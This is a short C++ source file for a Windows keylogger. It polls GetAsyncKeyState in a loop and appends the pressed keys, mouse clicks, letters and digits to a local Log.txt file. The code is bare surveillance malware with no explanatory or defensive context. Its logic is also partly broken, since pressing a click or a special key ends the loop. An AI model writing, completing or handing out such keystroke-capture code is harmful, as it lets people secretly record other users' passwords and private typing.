#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

int main(){
    ofstream record("Log.txt",ios::app);
    while(true){
        Sleep(100);
        if(GetAsyncKeyState(1)<0){
            record<<"LeftClick, ";
            break;
        }
        if(GetAsyncKeyState(2)<0){
            record<<"RightClick, ";
            break;
        }
        if(GetAsyncKeyState(8)<0){
            record<<"BackSpace, ";
            break;
        }
        if(GetAsyncKeyState(9)<0){
            record<<"Tab, ";
            break;
        }
        if(GetAsyncKeyState(13)<0){
            record<<"Enter, ";
            break;
        }
        if(GetAsyncKeyState(20)<0){
            record<<"CapsLock, ";
            break;
        }
        if(GetAsyncKeyState(32)<0){
            record<<"Space, ";
            break;
        }
        if(GetAsyncKeyState(46)<0){
            record<<"Delete, ";
            break;
        }
        for(int i=48;i<91;i++){
            if(GetAsyncKeyState(i)<0){
                record<<char(i)<<", ";
                break;
            }
        }
    }
}